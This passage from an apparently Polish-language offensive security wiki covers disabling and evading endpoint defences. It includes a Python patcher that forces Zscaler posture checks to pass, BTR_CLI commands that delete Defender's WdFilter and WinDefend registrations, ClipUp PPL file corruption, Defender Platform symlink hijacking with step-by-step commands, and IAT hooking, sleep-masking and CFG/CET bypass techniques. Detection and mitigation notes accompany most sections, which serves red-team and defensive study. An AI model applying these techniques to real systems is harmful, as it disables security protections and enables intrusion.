•  Monitoruj tworzenie nowych usług *kernel* i zgłaszaj alerty, gdy sterownik jest ładowany z katalogu z prawami zapisu dla wszystkich lub nie znajduje się na allow-liście.
•  Monitoruj uchwyty user-mode do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli stanu urządzenia Zscaler Client Connector przez patchowanie binariów na dysku

**Client Connector** firmy Zscaler stosuje lokalnie reguły stanu urządzenia i korzysta z Windows RPC, aby przekazywać wyniki innym komponentom. Dwa słabe założenia projektowe umożliwiają całkowite obejście zabezpieczeń:

1. Ocena stanu urządzenia odbywa się **w całości po stronie klienta** (na serwer wysyłana jest wartość logiczna).
2. Wewnętrzne punkty końcowe RPC sprawdzają jedynie, czy łączący się plik wykonywalny jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Przez **patchowanie czterech podpisanych binariów na dysku** można zneutralizować oba mechanizmy:

| Binary | Oryginalna logika poddana patchowaniu | Wynik |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola kończy się zgodnością |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione instrukcjami NOP ⇒ dowolny proces (nawet niepodpisany) może połączyć się z potokami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Fragment minimalnego patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu wyświetlają status **green/compliant**.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać endpointy RPC oparte na named pipe (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Zaatakowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez zasady Zscaler.

To studium przypadku pokazuje, jak za pomocą kilku prostych poprawek bajtów można obejść decyzje dotyczące zaufania podejmowane wyłącznie po stronie klienta oraz proste kontrole podpisów.

## Nadużycie zaufanej funkcjonalności Microsoft Defender `BTR.sys`

Sterownik **Boot-Time Removal** programu Defender stanowi użyteczny kontrprzykład dla klasycznego BYOVD. `BTR.sys` to legalny, podpisany przez Microsoft komponent naprawczy bez błędu powodującego uszkodzenie pamięci i bez interfejsu IOCTL; po uzyskaniu dostępu administratora i `SeLoadDriverPrivilege` operator może zamiast tego sfałszować prywatną transakcję naprawczą sterownika i uzyskać zamierzoną możliwość wykonywania operacji na plikach i rejestrze z poziomu Ring-0. Jest to **mechanizm neutralizacji AV/EDR po przejęciu systemu, a nie początkowy dostęp ani eskalacja uprawnień**, a sterownik można wyodrębnić z zasobu `BOOTTIMETOOL` pliku `MpEngine.dll` na samym celu, zamiast importować rzucający się w oczy sterownik innej firmy.<sup>[[36]](#references)</sup>

### Przygotowanie sterownika jednorazowego użytku

Defender zwykle zapisuje zasób jako plik o losowej nazwie `[a-z]{8}.sys` i rejestruje usługę jądra o podobnej nazwie. `DriverEntry` odczytuje wartość `Args` usługi, otwiera wskazany NTFS ADS, odszyfrowuje i weryfikuje listę akcji, zapisuje informacje zwrotne, a po pomyślnym wykonaniu zwraca `0xC0000056` (`STATUS_DELETE_PENDING`), aby sterownik został wyładowany, zamiast pozostać w pamięci. Sfałszowana usługa ma następujące charakterystyczne wartości.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Strumień `:changelist` zawiera jeden zaszyfrowany algorytmem RC4 blob. Analizowane kompilacje ponownie używają stałego klucza 256-bajtowego, więc szyfrowanie nie stanowi granicy autoryzacji. Prawidłowy tekst jawny zawiera 24-bajtowy nagłówek globalny (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC nagłówka i identyfikator transakcji wyliczony na podstawie payloadu), po którym następuje zakończona znakiem null ścieżka feedbacku w UTF-16 oraz dowolna liczba elementów. Każdy element ma 16-bajtowy nagłówek (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) oraz dane zależne od akcji, zakończone **dokładnie czterema bajtami NUL**. Każdy obszar nagłówka/danych jest niezależnie sprawdzany za pomocą CRC-32 z wielomianem `0xEDB88320`, stanem początkowym `0xFFFFFFFF` i **bez końcowego XOR** (`~CRC32`); stan CRC jest resetowany dla każdego obszaru.<sup>[[36]](#references)[[37]](#references)</sup>

Akceptowane identyfikatory akcji udostępniają następujące prymitywy jądra.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dane elementu | Wynik |
| --- | --- | --- |
| 1 | `[ścieżka UTF-16]` | Usunięcie pliku, także zablokowanego |
| 2 | `[ścieżka UTF-16]` | Usunięcie pustego katalogu |
| 3 | `[flagi][źródło][cel]` | Przeniesienie pliku do chronionej ścieżki wybranej przez atakującego; pusty cel oznacza usunięcie |
| 4 | `[flagi][ścieżka klucza]` | Rekurencyjne usunięcie klucza rejestru |
| 5 | `[flagi][ścieżka klucza + "\\" + wartość]` | Usunięcie wartości rejestru |
| 6 | `[flagi][typ][rozmiar][ścieżka klucza + "\\" + wartość][dane]` | Utworzenie/aktualizacja wartości rejestru i utworzenie brakujących ścieżek kluczy |

W przypadku akcji 5 i 6 separatorem klucza/wartości w danych przesyłanych po przewodzie są **dwa kolejne ukośniki odwrotne**; ścieżka sformatowana zgodnie ze standardową konwencją nie zostanie poprawnie podzielona. Plik feedbacku w większości odzwierciedla żądanie, ale pierwsze cztery bajty danych każdego elementu stają się jego wynikowym `NTSTATUS`. W przypadku akcji 1 i 2, które nie mają początkowego pola flag, BTR przesuwa ścieżkę do czterech zarezerwowanych bajtów końcowych, aby zrobić miejsce na ten status.<sup>[[36]](#references)</sup>

### Przepływ pracy `BTR_CLI` i okno wczesnego rozruchu

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) realizuje cały łańcuch: wyodrębnia `BTR.sys` z lokalnego Defendera, tworzy `<random>.sys:changelist` i strumień feedbacku, serializuje/sumuje kontrolnie/szyfruje powiązane akcje, bezpośrednio tworzy klucz rejestru usługi, a następnie wywołuje `NtLoadDriver` dla `-trigger now` albo pozostawia sterownik jako uruchamiany przy starcie systemu dla `-trigger boot`. Bezpośrednie przygotowanie wpisów w rejestrze omija standardową ścieżkę SCM `CreateServiceW`, dlatego **nie generuje** zdarzenia instalacji usługi o identyfikatorze 7045. Artefakty uruchamiane podczas rozruchu można później usunąć poleceniem `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nie nadaje się do użycia, ponieważ BTR wykonuje operacje wejścia/wyjścia na plikach z poziomu `DriverEntry`, zanim stos pamięci masowej i link `SystemRoot` będą gotowe. `Start=1` wraz z grupą o wysokim priorytecie `Boot Bus Extender` powoduje wykonanie w Phase 1: NTFS jest już dostępny, ale wiele sterowników zabezpieczeń uruchamianych przez system oraz usług EDR w trybie użytkownika nie zostało jeszcze zainicjowanych. Filtry uruchamiane podczas rozruchu, takie jak `WdFilter`, mogą być już załadowane, ale BTR może usunąć ich pliki binarne lub konfigurację usług przed kolejnym uruchomieniem i usunąć pliki wykonywalne usług, zanim uruchomi je SCM. ELAM nie eliminuje tej luki, ponieważ BTR działa po ocenie sterowników rozruchowych i ma prawidłowy podpis Microsoft.<sup>[[36]](#references)</sup>

Wiele działań wykonuje się w ramach jednej transakcji. PoC umieszcza na początku Action 1 dla zakodowanej na stałe ścieżki `\SystemRoot\Temp\BootClean.log`: BTR tworzy ten log, następnie realizuje własne żądanie usunięcia i usuwa go przed wyładowaniem. Ogranicza to ilość śladów, a zapisanie informacji zwrotnej w `<random>.sys:<random>.dat` pozwala usunąć sterownik i oba strumienie jednocześnie.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacje detekcyjne o wysokiej wartości

Reguły oparte wyłącznie na sygnaturach i lista blokowania podatnych sterowników Microsoftu nie zapobiegają nadużywaniu zamierzonych funkcji BTR. Preferuj poniższe korelacje behawioralne, odróżniając jednocześnie legalne działania z łańcucha Defender od działań dowolnego programu uruchamiającego.<sup>[[36]](#references)</sup>

- **Sysmon 15:** utworzenie `.sys:changelist` jest typowym elementem stagingu BTR. Strumień ADS `.dat` dołączony do tego samego `.sys` jest szczególnie podejrzany, ponieważ legalny Defender zwykle umieszcza informacje zwrotne w `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** koreluj bezpośrednie utworzenie `HKLM\SYSTEM\CurrentControlSet\Services\<random>` zawierającego `Args=...:changelist` i `Group=Boot Bus Extender` z brakiem odpowiadającego mu zdarzenia instalacji SCM.
- **Sysmon 6 -> 23:** koreluj załadowanie znanego sterownika BTR spoza łańcucha Defender z późniejszym usunięciem pliku przypisanym do `System`/PID 4, szczególnie gdy dotyczy to plików binarnych związanych z bezpieczeństwem.
- **Sysmon 11 -> 23:** generuj alerty o szybkim utworzeniu i usunięciu `\SystemRoot\Temp\BootClean.log` przez `System`/PID 4.
- Ograniczaj i audytuj przyznawanie/włączanie `SeLoadDriverPrivilege`; sam podpis Microsoftu nie wystarcza, by uznać działanie za zaufane, gdy sterownik narzędzia bezpieczeństwa jest przygotowywany przez `cmd.exe`, PowerShell lub nieznany proces.

## Nadużywanie Protected Process Light (PPL) do modyfikowania AV/EDR za pomocą LOLBINs

Protected Process Light (PPL) egzekwuje hierarchię sygnatariuszy/poziomów, tak aby tylko procesy o równym lub wyższym poziomie ochrony mogły modyfikować siebie nawzajem. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić plik binarny z obsługą PPL i kontrolować jego argumenty, możesz przekształcić nieszkodliwą funkcję (np. rejestrowanie) w ograniczony mechanizm zapisu wspierany przez PPL, działający na chronionych katalogach używanych przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co sprawia, że proces działa jako PPL
- Docelowy plik EXE (i wszystkie załadowane biblioteki DLL) musi być podpisany certyfikatem z EKU obsługującym PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony, odpowiadającego sygnatariuszowi pliku binarnego (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla sygnatariuszy anti-malware, `PROTECTION_LEVEL_WINDOWS` dla sygnatariuszy Windows). Nieprawidłowe poziomy spowodują niepowodzenie tworzenia procesu.

Zobacz też szersze wprowadzenie do PP/PPL i ochrony LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia uruchamiające
- Pomocnicze narzędzie open source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego pliku EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schemat użycia:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitive LOLBIN: ClipUp.exe
- Podpisany plik systemowy `C:\Windows\System32\ClipUp.exe` uruchamia sam siebie i przyjmuje parametr pozwalający zapisać plik dziennika w ścieżce wskazanej przez wywołującego.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie potrafi analizować ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać normalnie chronione lokalizacje.

Pomocniki krótkich ścieżek 8.3
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Łańcuch nadużycia (w zarysie)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z użyciem `CREATE_PROTECTED_PROCESS` za pomocą launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki dziennika ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli docelowy plik binarny jest zwykle otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu, zanim uruchomi się AV, instalując usługę autostartu, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność uruchamiania za pomocą Process Monitor (rejestrowanie rozruchu).
4) Po ponownym uruchomieniu zapis z uprawnieniami PPL następuje, zanim AV zablokuje swoje pliki binarne, uszkadzając docelowy plik i uniemożliwiając uruchomienie.

Przykładowe wywołanie (ścieżki ukryto/skrócono ze względów bezpieczeństwa):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Uwagi i ograniczenia
- Nie można kontrolować zawartości zapisywanej przez ClipUp — można określić tylko jej położenie; ta technika nadaje się do uszkadzania, a nie do precyzyjnego wstrzykiwania zawartości.
- Do zainstalowania/uruchomienia usługi i wykorzystania okna na restart wymagane są lokalne uprawnienia administratora/SYSTEM.
- Kluczowe jest wyczucie czasu: docelowy plik nie może być otwarty; wykonanie podczas rozruchu pozwala uniknąć blokad plików.

Wykrywanie
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy proces nadrzędny został uruchomiony przez niestandardowy program, w okolicach rozruchu.
- Nowe usługi skonfigurowane do automatycznego uruchamiania podejrzanych plików binarnych, które konsekwentnie uruchamiają się przed Defender/AV. Zbadaj utworzenie/modyfikację usług poprzedzające błędy uruchamiania Defendera.
- Monitorowanie integralności plików binarnych Defendera/katalogów Platform; nieoczekiwane tworzenie/modyfikowanie plików przez procesy z flagami procesów chronionych.
- Telemetria ETW/EDR: szukaj procesów utworzonych z flagą `CREATE_PROTECTED_PROCESS` oraz anomalii w użyciu poziomów PPL przez pliki binarne inne niż AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i w kontekście których procesów nadrzędnych; blokuj uruchamianie ClipUp poza uzasadnionymi przypadkami.
- Dobre praktyki dotyczące usług: ogranicz tworzenie/modyfikowanie usług uruchamianych automatycznie i monitoruj manipulowanie kolejnością uruchamiania.
- Upewnij się, że ochrona przed manipulacją Defendera i zabezpieczenia wczesnego uruchamiania są włączone; badaj błędy uruchamiania wskazujące na uszkodzenie plików binarnych.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach, na których znajdują się narzędzia zabezpieczające, o ile jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

## Manipulowanie Microsoft Defender przez przejęcie dowiązania symbolicznego do katalogu wersji Platform

Windows Defender wybiera platformę, z której działa, przez wyliczenie podkatalogów w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podkatalog z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia z niego procesy usługi Defender (odpowiednio aktualizując ścieżki usługi/rejestru). Mechanizm wyboru ufa wpisom katalogów, w tym punktom ponownej analizy katalogów (dowiązaniom symbolicznym). Administrator może wykorzystać to do przekierowania Defendera do ścieżki zapisywalnej przez atakującego i uzyskać możliwość DLL sideloading lub zakłócenia działania usługi.<sup>[[21]](#references)[[22]](#references)</sup>

Warunki wstępne
- Lokalny administrator (wymagany do tworzenia katalogów/dowiązań symbolicznych w katalogu Platform)
- Możliwość ponownego uruchomienia systemu lub wywołania ponownego wyboru platformy Defendera (restart usługi podczas rozruchu)
- Wymagane są tylko wbudowane narzędzia (`mklink`)

Dlaczego to działa
- Defender blokuje zapisy w swoich katalogach, ale mechanizm wyboru platformy ufa wpisom katalogów i wybiera leksykograficznie najwyższą wersję, nie sprawdzając, czy ścieżka docelowa prowadzi do chronionej/zaufanej lokalizacji.

Krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego katalogu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz wewnątrz Platform dowiązanie symboliczne do katalogu z wyższą wersją, wskazujące na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecany restart):
```cmd
shutdown /r /t 0
```
4) Sprawdź, czy MsMpEng.exe (WinDefend) uruchamia się z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Należy zaobserwować nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestru wskazującą tę lokalizację.

Opcje post-exploitation
- DLL sideloading/code execution: Umieść lub podmień biblioteki DLL ładowane przez Defendera z jego katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Zatrzymanie usługi/odmowa usługi: Usuń symlink wersji, aby przy następnym uruchomieniu skonfigurowana ścieżka nie była dostępna, a Defender nie mógł się uruchomić:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Pamiętaj, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga praw administratora.

## Hookowanie API/IAT + spoofing stosu wywołań za pomocą PIC (w stylu Crystal Kit)

Zespoły red team mogą przenieść unikanie wykrycia w czasie wykonywania z implantu C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego, niezależny od położenia kod (PIC). Uogólnia to unikanie wykrycia poza niewielki zestaw API udostępniany przez wiele kitów (np. CreateProcessA) i rozszerza te same zabezpieczenia na BOF-y oraz biblioteki DLL używane w post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście wysokiego poziomu
- Umieść blob PIC obok modułu docelowego za pomocą reflective loadera (na początku lub jako moduł towarzyszący). PIC musi być samodzielny i niezależny od położenia.
- Podczas ładowania hostującej biblioteki DLL przejdź przez jej IMAGE_IMPORT_DESCRIPTOR i zmień wpisy IAT dla wybranych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na proste wrappery PIC.
- Każdy wrapper PIC wykonuje techniki unikania wykrycia przed wywołaniem właściwego API. Typowe techniki obejmują:
  - Maskowanie/odsłanianie pamięci wokół wywołania (np. szyfrowanie obszarów beacona, RWX→RX, zmiana nazw/uprawnień stron), a następnie przywrócenie stanu po wywołaniu.
  - Spoofing stosu wywołań: utwórz wiarygodny stos i przejdź do docelowego API tak, aby analiza stosu wywołań wskazywała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Dla zapewnienia zgodności udostępnij interfejs, dzięki któremu skrypt Aggressor (lub jego odpowiednik) będzie mógł rejestrować API do hookowania dla Beacona, BOF-ów i bibliotek DLL używanych w post-exploitation.

Dlaczego w tym przypadku warto użyć hookowania IAT
- Działa dla dowolnego kodu korzystającego z hookowanego importu, bez modyfikowania kodu narzędzia ani polegania na Beaconie w zakresie proxy dla określonych API.
- Obejmuje biblioteki DLL używane w post-exploitation: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować te same techniki maskowania/ukrywania stosu przy ich wywołaniach API.
- Przywraca niezawodne użycie poleceń post-exploitation uruchamiających procesy w przypadku detekcji opartych na stosie wywołań, przez opakowanie CreateProcessA/W.

Szkic minimalnego hooka IAT (pseudokod C/C++ dla x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Zastosuj patch po relokacjach/ASLR, a przed pierwszym użyciem importu. Reflective loadery, takie jak TitanLdr/AceLdr, pokazują hookowanie podczas DllMain załadowanego modułu.
- Utrzymuj wrappery małe i bezpieczne dla PIC; rozwiąż prawdziwe API, korzystając z oryginalnej wartości IAT przechwyconej przed patchowaniem albo przez LdrGetProcedureAddress.
- Stosuj przejścia RW → RX dla PIC i unikaj pozostawiania stron z prawami do zapisu i wykonywania.

Stub do spoofingu stosu wywołań
- Stuby PIC w stylu Draugr budują fałszywy łańcuch wywołań (adresy powrotu w nieszkodliwych modułach), a następnie przekazują sterowanie do prawdziwego API.
- Pozwala to ominąć wykrywanie zakładające kanoniczne stosy wywołań z Beacon/BOFs do wrażliwych API.
- Połącz te techniki z przycinaniem stosu/łączeniem stosu, aby przed prologiem API znaleźć się wewnątrz oczekiwanych ramek.

Integracja operacyjna
- Dodaj reflective loader na początku DLL-i post-ex, aby PIC i hooki inicjalizowały się automatycznie podczas ładowania DLL-a.
- Użyj skryptu Aggressor do rejestrowania docelowych API, aby Beacon i BOFs mogły w przejrzysty sposób korzystać z tej samej ścieżki unikania wykrycia, bez zmian w kodzie.

Kwestie wykrywania/DFIR
- Integralność IAT: wpisy wskazujące na adresy spoza obrazu (sterty/anonimowe); okresowa weryfikacja wskaźników importu.
- Anomalie stosu: adresy powrotu nienależące do załadowanych obrazów; nagłe przejścia do PIC spoza obrazu; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy w IAT w obrębie procesu, wczesna aktywność DllMain modyfikująca thunki importu, nieoczekiwane obszary RX tworzone podczas ładowania.
- Unikanie ładowania obrazu: jeśli hookujesz LoadLibrary*, monitoruj podejrzane ładowania zestawów automation/clr skorelowane ze zdarzeniami maskowania pamięci.

Powiązane elementy i przykłady
- Reflective loadery wykonujące patchowanie IAT podczas ładowania (np. TitanLdr, AceLdr)
- Hooki maskujące pamięć (np. simplehook) i PIC przycinający stos (stackcutting)
- Stub do spoofingu stosu wywołań PIC (np. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Hooki IAT w czasie importu za pośrednictwem rezydentnego PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik loadera do `GetProcAddress` własnym resolverem, który najpierw sprawdza hooki:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Zbuduj **rezydentny PICO** (trwały obiekt PIC), który przetrwa po zwolnieniu pamięci przez tymczasowy PIC loadera.
- Udostępnij funkcję `setup_hooks()`, która nadpisuje resolver importów loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj importy przez ordinal i użyj wyszukiwania hooków opartego na hashu, np. `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie wywołaj prawdziwe `GetProcAddress`.
- Rejestruj cele hooków podczas linkowania, używając wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje dostępny, ponieważ znajduje się wewnątrz rezydentnego PICO.

Daje to **przekierowanie IAT w czasie importu** bez patchowania sekcji kodu załadowanej DLL po jej załadowaniu.

### Wymuszanie importów podatnych na hookowanie, gdy cel używa PEB-walking

Hooki w czasie importu zadziałają tylko wtedy, gdy dana funkcja rzeczywiście znajduje się w IAT celu. Jeśli moduł rozwiązuje API za pomocą PEB-walk + hash (bez wpisu importu), wymuś prawdziwy import, aby ścieżka `ProcessImports()` loadera go wykryła:

- Zastąp rozwiązywanie eksportu na podstawie hasha (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, umożliwiając przechwycenie podczas rozwiązywania importów przez reflective loader.

### Maskowanie snu/bezczynności w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste prymitywy oczekiwania/IPC** używane przez implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długiego oczekiwania opakuj wywołanie w łańcuch maskowania w stylu Ekko, który szyfruje obraz w pamięci podczas bezczynności:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z przygotowanymi ramkami `CONTEXT`.
- Typowy łańcuch (x64): ustaw obraz jako `PAGE_READWRITE` → zaszyfruj RC4 cały zamapowany obraz za pomocą `advapi32!SystemFunction032` → wykonaj blokujące oczekiwanie → odszyfruj RC4 → **przywróć uprawnienia poszczególnych sekcji**, przechodząc po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza szablon `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać każdy krok.

Szczegół operacyjny: zwracaj „success” dla długiego oczekiwania (np. `WAIT_OBJECT_0`), aby wywołujący kontynuował działanie, gdy obraz jest zamaskowany. Ten wzorzec ukrywa moduł przed skanerami podczas okresów bezczynności i pozwala uniknąć charakterystycznej sygnatury „patched `Sleep()`”.

Pomysły na wykrywanie (na podstawie telemetrii)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buforach o rozmiarze obrazu.
- `VirtualProtect` obejmujące duży zakres, po którym następuje niestandardowe przywracanie uprawnień poszczególnych sekcji.

### Rejestracja CFG w czasie działania dla gadżetów maskowania snu

Na celach z włączonym CFG pierwszy pośredni skok do gadżetu wewnątrz funkcji, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle spowoduje awarię procesu z kodem `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadżetu nie ma w metadanych CFG modułu. Aby łańcuchy w stylu Ekko/Kraken działały w utwardzonych procesach:<sup>[[30]](#references)</sup>

- Zarejestruj każde pośrednie miejsce docelowe używane przez łańcuch za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i wpisów `CFG_CALL_TARGET_VALID`.
- W przypadku adresów wewnątrz załadowanych obrazów (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **bazy obrazu** i obejmować **pełny rozmiar obrazu**.
- W przypadku ręcznie mapowanych obszarów/PIC/stomped użyj zamiast tego **bazy alokacji** i rozmiaru alokacji.
- Oznacz nie tylko gadżet dyspozytorski, ale także eksporty osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wywołania systemowe oczekiwania/zdarzeń) oraz wszelkie wykonywalne sekcje kontrolowane przez atakującego, które staną się pośrednimi celami.

Dzięki temu łańcuchy snu w stylu ROP/JOP zmieniają się z „działa tylko w procesach bez CFG” w wielokrotnego użytku prymityw dla `explorer.exe`, przeglądarek, `svchost.exe` i innych endpointów skompilowanych z `/guard:cf`.

### Spoofing stosu śpiących wątków zgodny z CET

Pełna zamiana `CONTEXT` jest łatwa do wykrycia i może powodować problemy w systemach CET Shadow Stack, ponieważ spoofowany `Rip` nadal musi być zgodny ze sprzętowym shadow stack. Bezpieczniejszy wzorzec maskowania snu to:<sup>[[30]](#references)</sup>

- Wybierz inny wątek w tym samym procesie i odczytaj granice jego stosu `NT_TIB` / TEB (`StackBase`, `StackLimit`) za pomocą `NtQueryInformationThread`.
- Zrób kopię zapasową prawdziwego TEB/TIB bieżącego wątku.
- Przechwyć prawdziwy kontekst śpiącego wątku za pomocą `GetThreadContext`.
- Skopiuj do kontekstu spoofowanego **wyłącznie** prawdziwy `Rip`, pozostawiając spoofowany stan `Rsp`/stosu bez zmian.
- W czasie snu skopiuj `NT_TIB` spoofowanego wątku do bieżącego TEB, aby stack walkery rozwijały stos wewnątrz prawidłowego zakresu.
- Po zakończeniu oczekiwania przywróć oryginalny TIB i kontekst wątku.

Zachowuje to wskaźnik instrukcji zgodny z CET, jednocześnie wprowadzając w błąd stack walkery EDR, które ufają metadanym stosu TEB podczas weryfikacji rozwijania stosu.

### Alternatywa oparta na APC: Kraken Mask

Jeśli wywołania timer-queue są zbyt charakterystyczne, tę samą sekwencję uśpienia, szyfrowania, spoofingu i przywracania można wykonać z zawieszonego wątku pomocniczego, używając kolejkowanych APC:<sup>[[27]](#references)</sup>

- Utwórz wątek pomocniczy z `NtTestAlert` jako punktem wejścia.
- Kolejkuj przygotowane ramki `CONTEXT`/APC za pomocą `NtQueueApcThread` i opróżniaj je przez `NtAlertResumeThread`.
